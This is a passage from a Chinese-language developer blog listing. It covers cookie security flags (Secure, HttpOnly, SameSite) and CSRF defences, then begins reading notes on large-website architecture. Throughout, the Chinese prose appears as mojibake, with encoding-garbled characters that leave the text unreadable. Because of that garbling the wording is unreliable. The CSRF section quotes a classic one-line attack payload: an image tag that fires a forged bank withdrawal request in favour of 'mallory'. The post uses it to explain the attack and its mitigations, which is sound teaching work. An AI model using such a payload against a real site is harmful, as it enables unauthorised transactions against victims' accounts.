<p>ä¸€ä¸ªå¸¦æœ‰å®‰å…¨å±æ€§çš„ cookie åªæœ‰åœ¨è¯·æ±‚ä½¿ç”¨SSLå’ŒHTTPSåè®®çš„æ—¶å€™æ‰ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ã€‚ç„¶è€Œï¼Œä¿å¯†æˆ–æ•æ„Ÿä¿¡æ¯æ°¸è¿œä¸è¦åœ¨ HTTP cookie ä¸­å­˜å‚¨æˆ–ä¼ è¾“ï¼Œå› ä¸ºæ•´ä¸ªæœºåˆ¶ä»æœ¬è´¨ä¸Šæ¥è¯´éƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œæ¯”å¦‚å‰è¿°åè®®å¹¶ä¸æ„å‘³ç€æ‰€æœ‰çš„ä¿¡æ¯éƒ½æ˜¯ç»è¿‡åŠ å¯†çš„ã€‚</p>
</blockquote>
<p>ç”¨æ³•ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; secure</span><br></pre></td></tr></table></figure>
<p><strong>HttpOnly</strong></p>
<blockquote>
<p>è®¾ç½®äº† HttpOnly å±æ€§çš„ cookie ä¸èƒ½ä½¿ç”¨ JavaScript ç»ç”±  <code>Document.cookie</code> å±æ€§ã€<code>XMLHttpRequest</code> å’Œ  <code>Request</code>APIs è¿›è¡Œè®¿é—®ï¼Œä»¥é˜²èŒƒè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚</p>
</blockquote>
<p>ç”¨æ³•ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; HttpOnly</span><br></pre></td></tr></table></figure>
<h3 id="Cookieä¸CSRFçš„å…³ç³»"><a href="#Cookieä¸CSRFçš„å…³ç³»" class="headerlink" title="Cookieä¸CSRFçš„å…³ç³»"></a>Cookieä¸CSRFçš„å…³ç³»</h3><p>CSRFåˆ©ç”¨äº†ç”¨æˆ·çš„Cookieï¼Œé€šè¿‡ç¬¬ä¸‰æ–¹è¯·æ±‚è·¨ç«™è¿›è¡Œæ”»å‡»ã€‚<br>ä»¥ä¸‹Wikipediaä¸­çš„ä¸€ä¸ªä¾‹å­ï¼šåœ¨ä¸å®‰å…¨èŠå¤©å®¤æˆ–è®ºå›ä¸Šçš„ä¸€å¼ å›¾ç‰‡ï¼Œå®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªç»™ä½ é“¶è¡ŒæœåŠ¡å™¨å‘é€æç°çš„è¯·æ±‚ï¼š<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>è¿™ç§æƒ…å†µä¼šç›´æ¥åœ¨æœ¬åœ°loadå›¾ç‰‡ï¼Œå›¾ç‰‡åœ°å€æŒ‡å‘çš„æ˜¯é“¶è¡Œã€‚è‹¥æœ¬åœ°æ‰“å¼€è¿‡è¯¥é“¶è¡Œç›¸å…³ä¿¡æ¯ï¼Œä¸”cookieæœ‰æ•ˆï¼Œåˆ™ä¼šç›´æ¥è¢«æ”»å‡»è€…çš„è´¦æˆ·æç°ã€‚</p>
<h4 id="åˆ†æCSRFæ”»å‡»"><a href="#åˆ†æCSRFæ”»å‡»" class="headerlink" title="åˆ†æCSRFæ”»å‡»"></a>åˆ†æCSRFæ”»å‡»</h4><ul>
<li>è¢«æ”»å‡»è€…æœ¬åœ°Cookieä¿¡æ¯æ²¡æœ‰è¿‡æœŸ</li>
<li>é“¶è¡Œè½¬è´¦ç³»ç»Ÿæ— äºŒæ¬¡ç¡®è®¤ï¼Œç›´æ¥è½¬è´¦</li>
<li>ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼ˆä¸å®‰å…¨çš„èŠå¤©å®¤æˆ–è®ºå›ï¼‰åŠ è½½è¯·æ±‚</li>
<li>æ”»å‡»è€…æ— æ³•è¯»å†™Cookie</li>
</ul>
<h4 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h4><ul>
<li>æ•æ„Ÿä¿¡æ¯è¿‡æœŸæ—¶æ•ˆç¼©çŸ­ï¼šç›®æ ‡ç½‘ç«™å¯¹æ•æ„ŸCookieè®¾ç½®è¾ƒçŸ­çš„è¿‡æœŸæ—¶é—´</li>
<li>å¢åŠ äºŒæ¬¡ç¡®è®¤ï¼šç›®æ ‡ç½‘ç«™å¯¹æ•æ„Ÿæ“ä½œæ— äºŒæ¬¡ç¡®è®¤</li>
<li>ä¸å…è®¸ç¬¬ä¸‰æ–¹ç½‘ç«™å¸¦cookieè®¿é—®ï¼šæ£€æŸ¥è®¿é—®è¯·æ±‚refereræ¥æºï¼Œç¦æ­¢ç¬¬ä¸‰æ–¹ç½‘ç«™è®¿é—®ã€‚</li>
<li>å…è®¸æœåŠ¡å™¨è¦æ±‚æŸä¸ªcookieåœ¨è·¨ç«™è¯·æ±‚æ—¶ä¸è¢«å‘é€ï¼šä½¿ç”¨cookieä¸­SameSiteæ ‡è¯†</li>
</ul>
<h4 id="å‚æ•°ä»‹ç»-1"><a href="#å‚æ•°ä»‹ç»-1" class="headerlink" title="å‚æ•°ä»‹ç»"></a>å‚æ•°ä»‹ç»</h4><p><strong>SameSiteï¼ˆç›®å‰å…¼å®¹æ€§ä¸è¶³ï¼Œä½†ä¸å½±å“è®¾ç½®ä¸æ”¯æŒè¯¥å±æ€§çš„æµè§ˆå™¨ï¼‰</strong></p>
<blockquote>
<p>å…è®¸æœåŠ¡å™¨è®¾å®šä¸€åˆ™ cookie ä¸éšç€è·¨åŸŸè¯·æ±‚ä¸€èµ·å‘é€ï¼Œè¿™æ ·å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²èŒƒè·¨ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»ï¼ˆCSRFï¼‰ã€‚</p>
</blockquote>
<p>ç”¨æ³•ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; SameSite <span class="comment">// default SameSite=Strict</span></span><br><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; SameSite=Lax</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>è¯·æ±‚ç±»å‹</strong></th>
<th><strong>ä¾‹å­</strong></th>
<th><strong>é SameSit</strong></th>
<th><strong>SameSite = Lax</strong></th>
<th><strong>SameSite = Strict</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">link</td>
<td>&lt;a href=â€â€¦â€></td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td style="text-align:left">prerender</td>
<td>\&lt;link rel=â€prerenderâ€ href=â€â€¦â€></td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td style="text-align:left">form get</td>
<td>&lt;form method=â€getâ€ action=â€â€¦â€></td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td style="text-align:left">form post</td>
<td>&lt;form method=â€postâ€ action=â€â€¦â€></td>
<td>Y</td>
<td>N</td>
<td>N</td>
</tr>
<tr>
<td style="text-align:left">iframe</td>
<td>&lt;iframe src=â€â€¦â€></td>
<td>Y</td>
<td>N</td>
<td>N</td>
</tr>
<tr>
<td style="text-align:left">ajax</td>
<td>$.get(â€˜â€¦â€™)</td>
<td>Y</td>
<td>N</td>
<td>N</td>
</tr>
<tr>
<td style="text-align:left">image</td>
<td>&lt;img src=â€â€¦â€></td>
<td>Y</td>
<td>N</td>
<td>N</td>
</tr>
</tbody>
</table>
<h2 id="è¦ç‚¹æ€»ç»“ï¼š"><a href="#è¦ç‚¹æ€»ç»“ï¼š" class="headerlink" title="è¦ç‚¹æ€»ç»“ï¼š"></a>è¦ç‚¹æ€»ç»“ï¼š</h2><ul>
<li><strong>Cookieæ˜¯æœåŠ¡å™¨ä¿å­˜åœ¨æœ¬åœ°çš„æ•°æ®å—</strong></li>
<li><strong>æ¯æ¬¡è¯·æ±‚éƒ½ä¼šåŒ…å«cookieï¼Œå› æ­¤ä¼šæ¯”è¾ƒæµªè´¹èµ„æº</strong></li>
<li><strong>ä½¿ç”¨document.cookieå¯è®¿é—®éHttpOnlyçš„cookie</strong></li>
<li><strong>åˆ é™¤æœ¬åœ°cookieåªèƒ½é€šè¿‡ç»™cookieè®¾ç½®è¿‡å»çš„Expireåˆ é™¤</strong></li>
<li><strong>å¸¸ç”¨é‰´åˆ«ç”¨æˆ·èº«ä»½çš„æ–¹æ³•æ˜¯ç»™cookieè®¾ç½®ç­¾åæˆ–token</strong></li>
<li><strong>ä¸ºé˜²æ­¢XSSã€CSRFï¼Œåº”è¯¥å°½é‡ä½¿ç”¨HttpOnlyã€Secure(https)ã€SameSiteå‚æ•°åŠæ£€æŸ¥referer</strong></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/éšç¬”/ã€Šå¤§å‹ç½‘ç«™æŠ€æœ¯æ¶ã€‹è¯»ä¹¦ç¬”è®°/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/éšç¬”/ã€Šå¤§å‹ç½‘ç«™æŠ€æœ¯æ¶ã€‹è¯»ä¹¦ç¬”è®°/" itemprop="url">ã€Šå¤§å‹ç½‘ç«™æŠ€æœ¯æ¶ã€‹è¯»ä¹¦ç¬”è®°</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-03-31T20:28:25+08:00">
                2019-03-31
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>æ‹œè¯»æœ¬ä¹¦åï¼Œå‘ç°æ¶æ„å¸ˆä¸€èŒæ‰€éœ€è¦æ‰¿æ‹…çš„èŒè´£ä¸ä»…ä»…æ˜¯é‚£ä¹ˆç®€å•ï¼Œä»–è‚©è´Ÿç€ä¸€ä¸ªç½‘ç«™çš„é«˜å¯ç”¨ã€é«˜å¹¶å‘ç­‰ç¨³å®šèŒè´£ã€‚ä¹Ÿè®©æˆ‘å—ç›ŠåŒªæµ…ï¼Œäº†è§£è®¸å¤šè¡Œå†…çŸ¥è¯†ã€‚</p>
<h3 id="å¤§å‹ç½‘ç«™ç³»ç»Ÿç‰¹ç‚¹"><a href="#å¤§å‹ç½‘ç«™ç³»ç»Ÿç‰¹ç‚¹" class="headerlink" title="å¤§å‹ç½‘ç«™ç³»ç»Ÿç‰¹ç‚¹"></a>å¤§å‹ç½‘ç«™ç³»ç»Ÿç‰¹ç‚¹</h3><ul>
<li>é«˜å¹¶å‘ã€å¤§æµé‡</li>
<li>é«˜å¯ç”¨</li>
<li>æµ·é‡æ•°æ®</li>
<li>ç”¨æˆ·åˆ†å¸ƒå¹¿æ³›ï¼Œç½‘ç»œæƒ…å†µå¤æ‚</li>
<li>å®‰å…¨ç¯å¢ƒæ¶åŠ£</li>
<li>éœ€æ±‚å¿«é€Ÿå˜æ›´ã€å‘å¸ƒé¢‘ç¹</li>
<li>æ¸è¿›å¼å‘å±•</li>
</ul>
<h2 id="å¤§å‹ç½‘ç«™æ¶æ„æ¼”åŒ–åŠå‘å±•å†ç¨‹"><a href="#å¤§å‹ç½‘ç«™æ¶æ„æ¼”åŒ–åŠå‘å±•å†ç¨‹" class="headerlink" title="å¤§å‹ç½‘ç«™æ¶æ„æ¼”åŒ–åŠå‘å±•å†ç¨‹"></a>å¤§å‹ç½‘ç«™æ¶æ„æ¼”åŒ–åŠå‘å±•å†ç¨‹</h2><h5 id="åˆæœŸç½‘ç«™"><a href="#åˆæœŸç½‘ç«™" class="headerlink" title="åˆæœŸç½‘ç«™"></a>åˆæœŸç½‘ç«™</h5><p><img src="/éšç¬”/ã€Šå¤§å‹ç½‘ç«™æŠ€æœ¯æ¶ã€‹è¯»ä¹¦ç¬”è®°/./websiteInit.jpeg" alt="åˆæœŸåº”ç”¨æœåŠ¡å™¨"></p>
<h5 id="æœ€ç»ˆæ¶æ„çš„å¤§å‹ç½‘ç«™"><a href="#æœ€ç»ˆæ¶æ„çš„å¤§å‹ç½‘ç«™" class="headerlink" title="æœ€ç»ˆæ¶æ„çš„å¤§å‹ç½‘ç«™"></a>æœ€ç»ˆæ¶æ„çš„å¤§å‹ç½‘ç«™</h5><p><img src="/éšç¬”/ã€Šå¤§å‹ç½‘ç«™æŠ€æœ¯æ¶ã€‹è¯»ä¹¦ç¬”è®°/./websiteDisAppAndUseTec.jpeg" alt="ä¸šåŠ¡åŠä½¿ç”¨nosql"></p>
<h3 id="æ¼”åŒ–è¿‡ç¨‹"><a href="#æ¼”åŒ–è¿‡ç¨‹" class="headerlink" title="æ¼”åŒ–è¿‡ç¨‹"></a>æ¼”åŒ–è¿‡ç¨‹</h3><ul>
<li>åº”ç”¨æœåŠ¡å™¨å’Œæ•°æ®æœåŠ¡å™¨åˆ†ç¦»ï¼šåº”ç”¨æœ‰å•ç‹¬çš„åº”ç”¨æœåŠ¡å™¨ï¼Œæ•°æ®æœ‰å•ç‹¬çš„æ•°æ®æœåŠ¡å™¨ï¼Œæ–‡ä»¶æœ‰å•ç‹¬çš„æ–‡ä»¶æœåŠ¡å™¨</li>
<li>æ·»åŠ ç¼“å­˜ï¼šå¢åŠ æœ¬åœ°ç¼“å­˜åŠåˆ†å¸ƒå¼ç¼“å­˜ï¼Œä½¿å¾—æ•°æ®åº“æŸ¥è¯¢çš„éƒ¨åˆ†æŸ¥è¯¢å¯ä»¥ä½¿ç”¨ç¼“å­˜æŸ¥è¯¢</li>
<li>ä½¿ç”¨æœåŠ¡å™¨é›†ç¾¤ï¼šå°†å•ä¸€æœåŠ¡å™¨å¤„ç†å˜æˆæœåŠ¡å™¨é›†ç¾¤å¤„ç†ï¼Œæå‡å¤„ç†èƒ½åŠ›</li>
<li>æ•°æ®åº“è¯»å†™åˆ†ç¦»ï¼šä¸»ä»æ•°æ®åº“åˆ†åˆ«è´Ÿè´£å†™ã€è¯»åŠŸèƒ½ï¼Œä¸»æ•°æ®åº“å†™å…¥æ•°æ®ï¼Œä¸»æ•°æ®åº“æœåŠ¡å™¨å°†æ•°æ®å†™å…¥ä»æ•°æ®åº“</li>
<li>ä½¿ç”¨åå‘ä»£ç†å’ŒCDNåŠ é€Ÿï¼šCDNå’Œåå‘ä»£ç†çš„åŸºæœ¬åŸç†éƒ½æ˜¯ç¼“å­˜ï¼ŒCDNå¯ä»¥ä½¿æœ€è¿‘çš„æœºæˆ¿æä¾›ç»™æœ€è¿‘çš„ç”¨æˆ·ï¼Œåå‘ä»£ç†æœåŠ¡å™¨è‹¥ç¼“å­˜è¿‡å…ˆå‰ä»ä¸­å¿ƒæœºæˆ¿ç»™ç”¨æˆ·çš„æ•°æ®ï¼Œåˆ™å°†æ•°æ®è¿”å›ç»™ç”¨æˆ·</li>
<li>ä½¿ç”¨åˆ†å¸ƒå¼æ–‡ä»¶ç®¡ç†ç³»ç»ŸåŠåˆ†å¸ƒå¼æ•°æ®åº“ç³»ç»Ÿï¼šåˆ†å¸ƒå¼æ•°æ®åº“åŠåˆ†å¸ƒå¼æ–‡ä»¶æ˜¯æ‹†åˆ†ç½‘ç«™æœ€åä¸å¾—å·²çš„æ‰‹æ®µï¼Œå°†ä¸åŒä¸šåŠ¡å­˜æ”¾åœ¨ä¸åŒç‰©ç†æœºä¸Š</li>
<li>ä½¿ç”¨NoSQLå’Œæœç´¢å¼•æ“ï¼šNoSQLå’Œæœç´¢å¼•æ“éƒ½æ˜¯æºè‡ªäºäº’è”ç½‘æŠ€æœ¯çš„æ‰‹æ®µï¼Œå¯¹äºå¯ä¼¸ç¼©çš„åˆ†å¸ƒå¼ç‰¹æ€§æœ‰æ›´å¥½çš„æ”¯æŒ</li>
<li>ä¸šåŠ¡æ‹†åˆ†ï¼šå°†ä¸åŒä¸šåŠ¡åˆ†åœ¨ä¸åŒäº§å“çº¿ï¼Œæ¯ä¸ªåº”ç”¨ç‹¬ç«‹éƒ¨ç½²</li>
<li>åˆ†å¸ƒå¼æœåŠ¡ï¼šå°†ä¸åŒæœåŠ¡çš„ç›¸åŒä¸šåŠ¡æå–å‡ºæ¥ï¼Œå°†å¯å¤ç”¨çš„ä¸šåŠ¡æä¾›ä¸šåŠ¡æ•°æ®åº“è¿æ¥åŠæä¾›ä¸šåŠ¡æœåŠ¡</li>
</ul>
<h3 id="ç½‘ç«™æ¶æ„è¯¯åŒº"><a href="#ç½‘ç«™æ¶æ„è¯¯åŒº" class="headerlink" title="ç½‘ç«™æ¶æ„è¯¯åŒº"></a>ç½‘ç«™æ¶æ„è¯¯åŒº</h3><ul>
<li>ä¸€å‘³è¿½æ±‚å¤§å…¬å¸è§£å†³æ–¹æ¡ˆï¼šåº”é’ˆå¯¹è‡ªèº«ä¸šåŠ¡æä¾›è§£å†³æ–¹æ¡ˆï¼Œè€Œéä¸€å‘³è¿½æ±‚å¤§å…¬å¸è§£å†³æ–¹æ¡ˆ</li>
<li>ä¸ºäº†æŠ€æœ¯è€ŒæŠ€æœ¯ï¼šç½‘ç«™æŠ€æœ¯æ˜¯ä¸ºä¸šåŠ¡è€Œå­˜åœ¨çš„ï¼Œé™¤æ­¤ä¹‹å¤–æ¯«æ— æ„ä¹‰</li>
<li>ä¼å›¾ç”¨æŠ€æœ¯è§£å†³æ‰€æœ‰é—®é¢˜ï¼šæŠ€æœ¯æ˜¯ç”¨æ¥è§£å†³ä¸šåŠ¡é—®é¢˜çš„ï¼Œè€Œä¸šåŠ¡é—®é¢˜ä¹Ÿå¯ä»¥é€šè¿‡ä¸šåŠ¡è§£å†³ã€‚ä¾‹å¦‚12306ï¼Œåˆ†æ—¶é—´æŠ¢ç¥¨æ¯”åŒæ—¶é—´æŠ¢ç¥¨æ›´åŠ æŠ€æœ¯ä¸Šæ›´å®¹æ˜“å®ç°ï¼Œä¸”ç³»ç»Ÿæ›´åŠ ç¨³å®š</li>
</ul>
<h2 id="å¤§å‹ç½‘ç«™æ¶æ„æ¨¡å¼"><a href="#å¤§å‹ç½‘ç«™æ¶æ„æ¨¡å¼" class="headerlink" title="å¤§å‹ç½‘ç«™æ¶æ„æ¨¡å¼"></a>å¤§å‹ç½‘ç«™æ¶æ„æ¨¡å¼</h2><h4 id="åˆ†å±‚"><a href="#åˆ†å±‚" class="headerlink" title="åˆ†å±‚"></a>åˆ†å±‚</h4><p><img src="/éšç¬”/ã€Šå¤§å‹ç½‘ç«™æŠ€æœ¯æ¶ã€‹è¯»ä¹¦ç¬”è®°/./hierarchy.jpeg" alt="åˆ†å±‚"></p>
<p>å¤§å‹ç½‘ç«™ä¸­æ¶æ„ä¹Ÿåˆ†å±‚ï¼Œå°†ç½‘ç«™è½¯ä»¶ç³»ç»Ÿæ°›å›´åº”ç”¨å±‚ã€æœåŠ¡å±‚ã€æ•°æ®å±‚ã€‚</p>
<p>åˆ†å±‚æ¶æ„çš„ç›®çš„ï¼šè§„åˆ’è½¯ä»¶æ¸…æ™°çš„é€»è¾‘ç»“æ„ä¾¿äºå¼€å‘ç»´æŠ¤ï¼Œä½†åœ¨ç½‘ç«™çš„å‘å±•è¿‡ç¨‹ä¸­ï¼Œåˆ†å±‚ç»“æ„å¯¹ç½‘ç«™æ”¯æŒé«˜å¹¶å‘å‘åˆ†å¸ƒå¼æ–¹å‘å‘å±•è‡³å…³é‡è¦ã€‚å› æ­¤åº”è¯¥åœ¨ç½‘ç«™å¾ˆå°çš„æ—¶å€™é‡‡ç”¨åˆ†å±‚æ¶æ„</p>
<p>åˆ†å±‚æ¶æ„å¸¦æ¥çš„æŒ‘æˆ˜ï¼šå¿…é¡»åˆç†è§„åˆ’å±‚æ¬¡è¾¹ç•Œå’Œæ¥å£ï¼Œåœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¸¥æ ¼éµå¾ªåˆ†å±‚æ¶æ„çš„çº¦æŸï¼Œç¦æ­¢è·¨å±‚æ¬¡çš„è°ƒç”¨ï¼ˆåº”ç”¨å±‚ç›´æ¥è°ƒç”¨æ•°æ®å±‚ï¼‰åŠé€†å‘è°ƒç”¨ï¼ˆæ•°æ®å±‚è°ƒç”¨æœåŠ¡å±‚ï¼Œæˆ–è€…æœåŠ¡å±‚è°ƒç”¨åº”ç”¨å±‚ï¼‰</p>
<h4 id="åˆ†å‰²"><a href="#åˆ†å‰²" class="headerlink" title="åˆ†å‰²"></a>åˆ†å‰²</h4><p>å¦‚æœè¯´åˆ†å±‚æ˜¯å¯¹è½¯ä»¶çš„æ¨ªå‘åˆ‡å‰²ï¼Œé‚£ä¹ˆåˆ†å‰²æ˜¯çºµå‘åˆ‡å‰²</p>
<p>ç½‘ç«™è¶Šå¤§ï¼ŒåŠŸèƒ½è¶Šå¤æ‚ï¼ŒæœåŠ¡å’Œæ•°æ®å¤„ç†çš„ç§ç±»ä¹Ÿè¶Šå¤šï¼Œå°†è¿™äº›ä¸åŒçš„åŠŸèƒ½å’ŒæœåŠ¡åˆ†å‰²å¼€æ¥ï¼ŒåŒ…è£…æˆé«˜å†…èšä½è€¦åˆçš„æ¨¡å—å•å…ƒï¼Œä¸€æ–¹é¢æœ‰åŠ©äºè½¯ä»¶çš„å¼€å‘å’Œç»´æŠ¤ï¼›å¦ä¸€æ–¹é¢ï¼Œä¾¿äºä¸åŒæ¨¡å—çš„åˆ†å¸ƒå¼éƒ¨ç½²ï¼Œæé«˜ç½‘ç«™çš„å¹¶å‘å¤„ç†èƒ½åŠ›å’ŒåŠŸèƒ½æ‰©å±•èƒ½åŠ›ã€‚</p>
<p>å¤§å‹ç½‘ç«™åˆ†å‰²çš„ç²’åº¦å¯èƒ½ä¼šå¾ˆå°ã€‚æ¯”å¦‚åœ¨åº”ç”¨å±‚ï¼Œå°†ä¸åŒä¸šåŠ¡è¿›è¡Œåˆ†å‰²ï¼Œä¾‹å¦‚å°†è´­ç‰©ã€è®ºå›ã€æœç´¢ã€å¹¿å‘Šåˆ†å‰²æˆä¸åŒçš„åº”ç”¨ï¼Œç”±ç‹¬ç«‹çš„å›¢é˜Ÿè´Ÿè´£ï¼Œéƒ¨ç½²åœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼›åœ¨åŒä¸€ä¸ªåº”ç”¨å†…éƒ¨ï¼Œå¦‚æœè§„æ¨¡åºå¤§ä¸šåŠ¡å¤æ‚ï¼Œä¼šç»§ç»­è¿›è¡Œåˆ†å‰²ï¼Œæ¯”å¦‚è´­ç‰©ä¸šåŠ¡ï¼Œå¯ä»¥è¿›ä¸€æ­¥åˆ†å‰²æˆæœºç¥¨é…’åº—ä¸šåŠ¡ã€3Cä¸šåŠ¡ç­‰</p>
<h4 id="åˆ†å¸ƒå¼"><a href="#åˆ†å¸ƒå¼" class="headerlink" title="åˆ†å¸ƒå¼"></a>åˆ†å¸ƒå¼</h4><ul>
<li>åˆ†å¸ƒå¼åº”ç”¨å’ŒæœåŠ¡ï¼š å¯ä»¥æ”¹å–„ç½‘ç«™æ€§èƒ½å’Œå¹¶å‘æ€§ã€åŠ å¿«å¼€å‘å’Œå‘å¸ƒé€Ÿåº¦ã€å‡å°‘æ•°æ®åº“è¿æ¥èµ„æºæ¶ˆè€—å¤–ï¼›è¿˜å¯ä»¥ä½¿ä¸åŒåº”ç”¨å¤ç”¨å…±åŒçš„æœåŠ¡ï¼Œä¾¿äºä¸šåŠ¡åŠŸèƒ½æ‰©å±•</li>
<li>åˆ†å¸ƒå¼é™æ€èµ„æºï¼šç½‘ç«™çš„é™æ€èµ„æºä¾‹å¦‚jsã€cssã€imageç­‰é™æ€èµ„æºå¯ä»¥ç‹¬ç«‹åˆ†å¸ƒéƒ¨ç½²ï¼Œå¹¶é‡‡ç”¨ç‹¬ç«‹èµ„æºã€‚å¯ä»¥å‡è½»åº”ç”¨æœåŠ¡å™¨å‹åŠ›</li>
<li>åˆ†å¸ƒå¼æ•°æ®åŠå­˜å‚¨ï¼šå•å°æœºå™¨æ— æ³•æä¾›æµ·é‡å­˜å‚¨</li>
<li>åˆ†å¸ƒå¼è®¡ç®—ï¼šç›®å‰ç½‘ç«™å¤§éƒ¨åˆ†ä½¿ç”¨HadoopåŠå…¶MapReduceåˆ†å¸ƒå¼è®¡ç®—æ¡†æ¶ä½¿ç”¨å¤„ç†è®¡ç®—ã€‚</li>
<li>åˆ†å¸ƒå¼é…ç½®ï¼Œåˆ†å¸ƒå¼é”ï¼Œåˆ†å¸ƒå¼æ–‡ä»¶ç­‰</li>
</ul>
<h4 id="é›†ç¾¤"><a href="#é›†ç¾¤" class="headerlink" title="é›†ç¾¤"></a>é›†ç¾¤</h4><p>å¤šå°æœåŠ¡å™¨å¯æˆä¸€ä¸ªé›†ç¾¤ï¼Œé€šè¿‡è´Ÿè½½å‡è¡¡å¯¹å¤–æä¾›æœåŠ¡ï¼Œé€šè¿‡è´Ÿè½½å‡è¡¡æ–°å¢æˆ–æ›´æ›¿æœºå™¨</p>
<h4 id="ç¼“å­˜"><a href="#ç¼“å­˜" class="headerlink" title="ç¼“å­˜"></a>ç¼“å­˜</h4><p>ç¼“å­˜å°±æ˜¯å°†æ•°æ®å­˜æ”¾åœ¨è·ç¦»è®¡ç®—æœ€è¿‘çš„ä½ç½®ä»¥åŠ å¿«å¤„ç†é€Ÿåº¦ã€‚ç¼“å­˜æ˜¯æ”¹å–„è½¯ä»¶æ€§èƒ½çš„ç¬¬ä¸€æ‰‹æ®µ</p>
<ul>
<li>CDNï¼šå¯ä»¥ç¼“å­˜ä¸€äº›è¾ƒå°‘å˜åŒ–æ•°æ®ï¼Œå¦‚è§†é¢‘æ–‡ä»¶ç­‰ï¼Œå¯ä»¥å°±è¿‘è¿…é€Ÿè¿”è¿˜ç»™ç”¨æˆ·</li>
<li>åå‘ä»£ç†ï¼šå½“ç”¨æˆ·è¯·æ±‚åˆ°è¾¾ä¸­å¿ƒæ—¶ï¼Œæœ€å…ˆè®¿é—®åå‘ä»£ç†æœåŠ¡å™¨ï¼Œè¿™é‡Œç¼“å­˜çš„æ˜¯é™æ€èµ„æºï¼Œæ— éœ€è½¬åº”ç”¨æœåŠ¡å™¨å°±å¯è¿”å›ç»™ç”¨æˆ·</li>
<li>æœ¬åœ°ç¼“å­˜ï¼šç¼“å­˜ç€çƒ­ç‚¹æ•°æ®ï¼Œæ— éœ€è®¿é—®æ•°æ®åº“ç›´æ¥å¯ä»¥å–åˆ°ï¼Œç›¸æ¯”ç¼“å­˜æœåŠ¡å™¨æ›´è¿…é€Ÿ</li>
<li>åˆ†å¸ƒå¼ç¼“å­˜ï¼šç½‘ç«™æ•°æ®ååˆ†åºå¤§æ—¶ï¼Œæœ¬åœ°ç¼“å­˜æ— æ³•è§£å†³é—®é¢˜ã€‚</li>
</ul>
<p>ä½¿ç”¨ç¼“å­˜æœ‰ä¸¤ä¸ªå‰ææ¡ä»¶ï¼Œä¸€æ˜¯æ•°æ®è®¿é—®çƒ­ç‚¹ä¸å‡è¡¡ï¼ŒæŸäº›æ•°æ®ä¼šè¢«æ›´é¢‘ç¹çš„è®¿é—®ï¼Œè¿™äº›æ•°æ®åº”è¯¥æ”¾åœ¨ç¼“å­˜ä¸­ï¼›äºŒæ˜¯æ•°æ®åœ¨æŸä¸ªæ—¶é—´æ®µå†…æœ‰æ•ˆï¼Œä¸ä¼šå¾ˆå¿«è¿‡æœŸï¼Œå¦åˆ™ç¼“å­˜çš„æ•°æ®å°±ä¼šå› å·²ç»å¤±æ•ˆè€Œäº§ç”Ÿè„è¯»ï¼Œå½±å“ç»“æœçš„æ­£ç¡®æ€§</p>
<h4 id="å¼‚æ­¥"><a href="#å¼‚æ­¥" class="headerlink" title="å¼‚æ­¥"></a>å¼‚æ­¥</h4><ul>
<li>æé«˜ç³»ç»Ÿå¯ç”¨æ€§ï¼šæ¶ˆè´¹è€…æœåŠ¡å™¨å‘ç”Ÿæ•…éšœï¼Œæ•°æ®ä¼šåœ¨æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡å™¨ä¸­å­˜å‚¨å †ç§¯ï¼Œç”Ÿäº§è€…æœåŠ¡å™¨å¯ä»¥ç»§ç»­å¤„ç†ä¸šåŠ¡è¯·æ±‚ï¼Œç³»ç»Ÿæ•´ä½“è¡¨ç°æ— æ•…éšœ</li>
